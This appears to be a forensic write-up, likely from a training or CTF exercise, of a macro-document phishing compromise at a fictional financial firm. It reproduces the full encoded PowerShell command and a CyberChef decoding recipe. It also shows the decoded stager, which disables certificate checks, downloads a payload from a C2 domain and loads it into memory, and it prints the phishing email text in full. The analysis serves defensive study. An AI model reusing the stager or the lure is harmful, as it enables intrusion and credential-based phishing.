# Forensic Analysis of WKST01 Collections

**TimeLine:**

| Timestamp | Activity |
| -- | -- |
| 02/12/2022 21:10:06 +0000 | Malicious Email Received |
| 02/12/2022 21:12:12 +0000 | Macros Enabled |
| 02/12/2022 21:12:12 +0000 | Malicious Powershell Payload Executed |
| 02/12/2022 22:31:57 +0000 | Connection from explorer.exe to 3.132.192[.]16 (malwarelove[.]xyz) |

---

**Conclusion:** Amanda Nuensis received an email with a malicious document (detected as: Trojan:O97M/Sadoca.C!ml by Windows Defender).  She opened it and enabled Macros, which dropped a malicious Powershell script that communicated with a C2 server (https://malwarelove[.]xyz/index-en-US.html / 3.132.192[.]16) and downloaded malware.  The payload could not be downloaded, since the server no longer responds.

---

## Collection-wkst01_magnumtempus_financial-2022-02-12T23_46_58Z

---

**Finding 1:** Powershell Encoded Malware in: Windows PowerShell.evtx
  
**Encoded Malware Located in EVTX: 2022-02-12 21:12:12**
```
powershell -exec bypass -nologo -nop -w 
hidden -enc KAAgAG4ARQB3AC0AbwBiAGoARQBD
AFQAIABJAG8ALgBzAHQAcgBFAEEAbQBSAEUAQQBk
AGUAcgAoACAAKABuAEUAdwAtAG8AYgBqAEUAQwBU
ACAASQBvAC4AYwBvAG0AUABSAGUAcwBTAGkATwBu
AC4AZABFAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAo
ACAAWwBzAFkAUwB0AGUATQAuAEkAbwAuAE0AZQBt
AE8AcgBZAHMAdAByAEUAQQBNAF0AIABbAEMAbwBu
AFYAZQBSAFQAXQA6ADoARgBSAG8AbQBiAEEAUwBF
ADYANABzAHQAcgBpAG4ARwAoACAAJwBYAFYAYgBM
AGIAbABRADUARQBQADIAVgBXAG8AQQA2AEwAUgB4
AGsAWAA3ACsAWABJAEcAVQBCAEMAMABDAEIAeABV
AGgAUgBOAEUASQBvAFEARABaAEIAQQBzAFMARwBt
AFgAKwBuAFQAagAxADgAYgA1AEMAZwB1ADIATwBY
ADYAMwBGADgANgBwAFQAcABPAFYAMwBRAHgAYwAy
AFAARAA5AGYAMwBiADcANwBjAFAAdgBsADEAOQBm
ADMAbAAyAC8AZABYADcANgA3AHYAUABsADkAZAAz
AHoAMQA4AHUAagB2AGYAcABKAEIAdgBuADUAMwAr
AE8AVgAyACsAZgBuAHYALwA1AG4AUQA2AHcANQA0
AHUAWgBxAEoAQQBmAGYAQgBIAGkAdgBpAFoAVQBx
AE4AUQBXAGgAaABaAGwAMABKAEsAUgBaAFkASAAv
AHEAeQBCADUAcgBTAE4ARQBZAGsAMwBrAHkAMgBu
AEYAUABVADAAZQArAHQAaABkAHUAeABGAHQAdQA1
AGkAegBjADcAYwBQAFgAdQBiAE8AVgBEAGwAawBI
AFYAdwBtAEUATQBVAEIARgBsAG0AZwBWAHIAZgBr
AHkAcQBlAG0AZwBhAEwAbQAvAHgAaQBWADUAeQBO
AHgAdABCAE4AVABtAGMAMABoAEkAWABSAFUAQgB2
ACsARgBXAEUAVgBrAEoAMgBzAEkARwAxAEoAdQBI
AFgAWgBNAEYAdABPAGEAUQA1AFoAZwBOAHMAVQBl
AFQATgB6AG8ASgBiAGsASwAyADIAYwBhADAAWQBV
AEYAQwBrAFoAcAB0AFEAMQBaAHQAcgBZAGEAdwBV
AHkATQBPAEQAMQBLAFMANABhAEoAOQAvAEgAWABz
AFUATQBWAEoAQgBRAGgAKwBWAEUAeQBHAGEAYgBj
ADEAbwBKAGUAVgBOAE0AdABvAFIAQQAxAFQAQQBW
AG0AeABTAG4AWABBADEAZgBsAHkAMwB3AFQAdQBF
AHoAdwA0AEYAQwA5AG8AQgBOAFMAaQBFAHYAWABt
AE4ASAB6AGIAdgBPADgAQwBoAEYAWQBvAGQAOQBV
ADMAKwBBAEsARQBZADcANABwAGgAWAB0AGEARgBt
AFMAQgBxAGMAVgBQAGcARAAvAHkAbQB6AGwAMQBI
AGQAVgB1AEcAUQBzAHgAbgBsAFoAagBYAFEAdQBs
AHMATgB3AGcAVwBzADYATQA0AEsASgBtAFIAcQB0
AHMAVQByAHAAUgB6AGMAZwAxAEsAawBYAE4AdgA4
ADUAcQBWAEcAMwBCAHYAdQByAC8AUgBRAHMAeQBT
AEsAagA2AEcAbgBTAHIAYgBqAGoASwBtADQARwB0
ADIAdgBQADYANQBhAGgAQQBrAEMAZgBnADIAYQBh
AE4AWgB2AFAAZwBTAGcAYQBVAGcAcABHADMAWgBR
AHoAeQBDAEIASABOAC8AQQBVAG4AWQBVAGYAMgAr
AEMAeQBnAGYAcQBCAGoAbwBnAE0ARwBlAE0AWQBK
AFgAWgBVAGoAZgBIAEkAaABzADYAZABTAHIARABI
AHEAZQByADMARABLAE0AYgBHAEUARQBRADEATwBP
AGoAWQBVAHUAQQBBAHUAMQBJADQAQgB3AFkANgAv
AGQAWQB5AFcAcABuADMAcQBDAHAAVABwAFkAagBQ
AE0AVgBJAHoAdgBRADQASwBQAHcARgBnADEASABy
AGgAbQBsAHIAcQBOAFkATABKAFAAQwA4AFcANAAx
AHAAaABrAFUAdwA2ADcASABoAFUAbQB4AEYAawBm
AFQAKwBpADEARwBEAGMAUABYAFYAbwBSAGUASABp
AFIAcAB4AG8ASgBzAHMANQBaAEIAcABuAEsAeABx
AGoAZwBsAFMASgBxAEsASwAvAGMASgArAGwATgBV
AEQASgBLAEYAdgArAFUAdQByAFcAdgBRAE4ATQBw
AGYAYgBaAHEARAB3AEcAbgBUAG8AQQAvADUAQgBy
AGQAZABvAEwATAAwADkAVwBKAHkAMQBRADYAYwB1
AEIAMABXAEwARwBEAGYAbABrAHgASgBTAFMASQBn
AG8AZwBSAEQAdwByAHIAbgBPAFQAUgBsADEANABw
AGsAWgBKAEQAZQBQAGoAWQBpAHEAYQBwAEsASwA4
AGUARAAzAEIAbABTAFkAbwAvAE4AMQB2AGQATgBL
AFMAMQBxAGkAUwA2ADkAMQBoAGsAaQB1AGkAWQBC
AG4ARAA1AEUAYQBLAFoAZwA2AEsAeQBlAEYAbgB0
AEYANABDAEEAcwBhADgAbABRADgAcABDAHUAUQBK
AEUAOABwAEEAdABUAHAAUwBXADMASwBqADYAcQAr
AFMASgBvADAAYwA2AFIAbwBhAGMAUQBVAGgAdgBt
AEIAZgBDAEoATABwAHMARQBpADgAdQAvAGsAagBD
AEEARgBBADEASgBwAEEATQBKAEEAOABMAHYANABT
ADgAawBiAEQAagBvAG4AVgBqAEIAMABtAHoATgA0
AEQARgBkAEoANQBFAEcAQwBXAGsANgB4AEIAeABr
AFkAeABOAG8AcgBEAGIAWABVAEIAMQA4AHAAdABF
AHEAVwBEADQAeABsAFoAKwBxAEkAMQByAHYATQBF
AGsALwB6AEsAQgBFAGgALwB5AEUANgBGAEQAVgBZ
AFQATQBVAFIAWgByAFQAbwBRAFMAMwBhADgAUQBK
AEEARQBZACsANQBoAFIAdQB6AHAAcABNAEgAdwBY
AG8AeABRAEQAOQAyAEsAeABxAHcAYgB4ADAAZABM
AFUAawBNAFUAVQB1AEgANgB1AFEAVQAyAFgAYQBM
AEYAVAAxADIAYwBVAEgAbQBlADgAQwA0AE4AWgBB
AGUAegAwAGIAVQBNAHEAQgAyADYANQBOAEoAbQBm
AFEANwBOAEsAZABuAGUARABPAFUAVwBtADEAUgBC
AHUAagBxAEsAcABxADYANgAwAGsAbwBWAGgAQQBS
AGsAYQBJAFQAQgBxAGUAawBBAFYAMwBYAEIAYgB0
AHAAegBGAGUAeAB3AGYAKwBTAFgAKwBoAEIAdwA4
AGoAbgBKAFoATwBpAEgAQwBzADUAdAA2ADcAdwBJ
AFIAbQBPAHgARABVAGgAMgBuAHkASQBiADMAcQBT
AEsAYgA0ADAAcAB0AFYAeAA3AFUAMQBsADkARgB5
AEIAaQBYAFIASQBCAHYAcAAwAGcAbgBlAEMATAAz
AHAAVABXAHYANwByAEgAbgBhADkARQBrAGoATgBa
AEQAcQBvAEEAeAAyAEMAVABPAFAATABMAEkAZQBn
AEcATgA3AGoAZgBsAHcAWABQAE4AVQA1AG4AdQBt
AHMAQgA1AG8AWQA3ADMAYQArAHIAcQA5AHEASgAy
AGgAagB3AFEAWABEAHgAQwB4AEYASgB0ADkAQQBL
ADUANwBOAFMAMgBzAGgAbABBACsANABvACsAcwA3
ADcAbwBtAGMAOQBzAG4ASgBoADUANwBPACsAUgBL
AHoAYgBKAGUASgBrAHIAMwBUAEUAYwBQAHQATAB2
AHcAWQBXAEEAVABnAGMANwAwAEgAegAzADkAegBZ
AC8AYwArADQAZQBmAHQALwBUAGsAMwA4AHUAUABQ
ACsAagBtADAAOQBjAFgAMwAyAC8AUAAvADkAUAA1
ADgAdgBXADMAVgB3ACsAbgBFADUAMwAvAEEAQQA9
AD0AJwAgACkALABbAEkATwAuAEMAbwBNAFAAcgBl
AFMAcwBJAG8AbgAuAEMATwBNAFAAUgBlAHMAUwBJ
AG8ATgBtAG8AZABFAF0AOgA6AGQARQBDAE8AbQBw
AHIAZQBzAFMAIAApACkALAAgAFsAVABlAHgAVAAu
AEUATgBDAG8AZABJAG4AZwBdADoAOgBhAFMAYwBJ
AGkAKQAgACkALgByAGUAQQBkAFQATwBlAG4AZAAo
ACAAKQAgAHwAIAAuACAAKAAgACQAUwBIAGUATABs
AEkARABbADEAXQArACQAcwBoAGUATABsAEkAZABb
ADEAMwBdACsAJwBYACcAKQA=
```

**CyberChef Recipe:**
```
From_Base64('A-Za-z0-9+/=',true)
Remove_null_bytes()
Regular_expression('User defined','[a-zA-Z0-9+/]{30,}',true,true,false,false,false,false,'List matches')
From_Base64('A-Za-z0-9+/=',true)
Raw_Inflate(0,0,'Adaptive',false,false)
Remove_whitespace(true,true,true,true,true,false)
Regular_expression('User defined','[0-9]{2,4}',true,true,false,false,false,false,'List matches')
From_Decimal('Line feed',false)
Find_/_Replace({'option':'Simple string','string':''+''},'',true,false,true,false)
Generic_Code_Beautify()
```

**Decoded Output:**
```
[Net.ServicePointManager]::ServerCertificateValidationCallback = {
$true
};
$wc = New - Object System.Net.WebClient;
$wc.Headers.Add(('User-Agent'), ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0'));
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$a = (New - Object net.webclient).DownloadData(('https://malwarelove.xyz/index-en-US.html'));
$b = [System.Reflection.Assembly]::Load($a);
```

---

**Finding 2:** Active connection in memory to 3.132.192.16:443

**Found in Memory (Netscan):**
```
0x9a075bc729d0 TCPv4 172.16.50.130:50067 3.132.192.16:443 ESTABLISHED -1
```

---

**Finding 3:** Active connection (Netstat) to 3.132.192.16:443 from explorer.exe

**Windows.Network.NetstatEnriched>Netstat.json:**
```
{
  "Pid":5900,
  "Ppid":5912,
  "Name":"explorer.exe",
  "Path":"C:\Windows\explorer.exe",
  "CommandLine":"C:\Windows\Explorer.EXE","Hash":

  {
    "MD5":"f7fdeca990692d53d7e4e396b0bd711e",
    "SHA1":"2d8ef17b2b4e570666ce78730929a3ff24c06e5b",
    "SHA256":"1f955612e7db9bb037751a89dae78dfaf03d7c1bcc62df2ef019f6cfe6d1bba7"
  },

  "Username":"MAGNUMTEMPUS\amanda.nuensis",
  "Authenticode":

  {
    "Filename":"C:\Windows\explorer.exe",
    "ProgramName":"Microsoft Windows",
    "PublisherLink":null,
    "MoreInfoLink":"http://www.microsoft.com/windows",
    "SerialNumber":"3300000266bd1580efa75cd6d3000000000266",
    "IssuerName":"C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows Production PCA 2011",
    "SubjectName":"C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=Microsoft Windows",
    "Timestamp":null,
    "Trusted":"trusted",
    "_ExtraInfo":null},
    "Family":"IPv4",
    "Type":"TCP",
    "Status":"ESTAB",
    "Laddr.IP":"172.16.50.130",
    "Laddr.Port":50067,
    "Raddr.IP":"3.132.192.16",
    "Raddr.Port":443,
    "Timestamp":"2022-02-12T22:31:57Z"
  }
```

---

**Finding 4:** Failed Logins 

**Failed Logins:**
```
amanda.nuensis: 12
amanda.nuensis@magnumtempus.financial: 4
administrator: 1
```

---

**Finding 5:** MalSpam to amanda.nuensis@magnumtempusfinancial.com

**Malspam:**
```
From - Sat Feb 12 21:10:06 2022
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: legal-internal@magnumtempus.financial
Received: from ip-172-16-21-100.us-east-2.compute.internal (ip-172-16-21-100.us-east-2.compute.internal [172.16.21.100])
by magnumtempusfinancial.com with ESMTP
; Sat, 12 Feb 2022 21:10:06 +0000
Message-ID: AE5026CE-73A0-489F-AFE9-6EE4014C24DE@magnumtempusfinancial.com
Content-Type: multipart/mixed; boundary="===============3336088841023311151=="
MIME-Version: 1.0
Subject: [ACTION REQUIRED] ORGANIZATION IT POLICY VIOLATION
From: legal-internal@magnumtempus.financial
To: amanda.nuensis@magnumtempusfinancial.com

--===============3336088841023311151==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

The MagnumTempus Financial CERT and CyberSecurity team have noticed that you are one of the users - "karen.metuens@magnumtempus.financial", "amanda.nuensis@magnumtempus.financial", who have violated the company policy CCG-IV:5-8 on 2/7/2022, 8:48pm - EDT.

As mentioned in the yearly cybersecurity training and your employment agreement with MagnumTempus, the violation of IT policy may terminate your employment.

Please review the attachment which includes the decision made by the MagnumTempus Legal team. If the document is empty, reply to this email within 72 hours of opening the document.

Thank you,
MagnumTempus Internal Legal Department
(+1)969-555-5984
legal-internal@magnumtempus.financial

--===============3336088841023311151==
Content-Type: application/octet-stream
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
filename=MagnumTempus-Policy-Violation-amanda.nuensis@magnumtempusfinancial.com.doc
```

---

**Finding 6:** amanda.nuensis enabled macros opening MalDoc (NTUSER.DAT)

**Macros Enabled:** amanda.nuensis - MagnumTempus-Policy-Violation-amanda.nuensis@magnum tempusfinancial.com.doc
```
2022-02-12 21:12:12: "wkst01.magnumtempus.financial" - HKU\S-1-5-21-2370586174-1517003462-11420 29260-1126\SOFTWARE\Microsoft\Office\16. 0\Word\Security\Trusted Documents\TrustR ecords\%USERPROFILE%/Desktop/MagnumTempu s-Policy-Violation-amanda.nuensis@magnum tempusfinancial.com.doc
2022-02-12 22:43:07: "wkst01.magnumtempus.financial" - HKU\S-1-5-21-2370586174-1517003462-11420 29260-1126\SOFTWARE\Microsoft\Office\16. 0\Word\Security\Trusted Documents\TrustR ecords\file://files.magnumtempusfinancia l.com/public/Depts/Marketing/Marketing%2 0Template.docx
```

---

**Other Stuff:**

**Obfuscated Powershell:** Ansible / Setup - Not Malicious:
```
- UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBv
- JgBjAGgAYwBwAC4AYwBvAG0AIAA
- UwBlAHQALQBTAHQAcgBpAGMAdAB
- YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAg
- WwBDAG8AbgBzAG8AbABlAF0AOgA6AEk
```
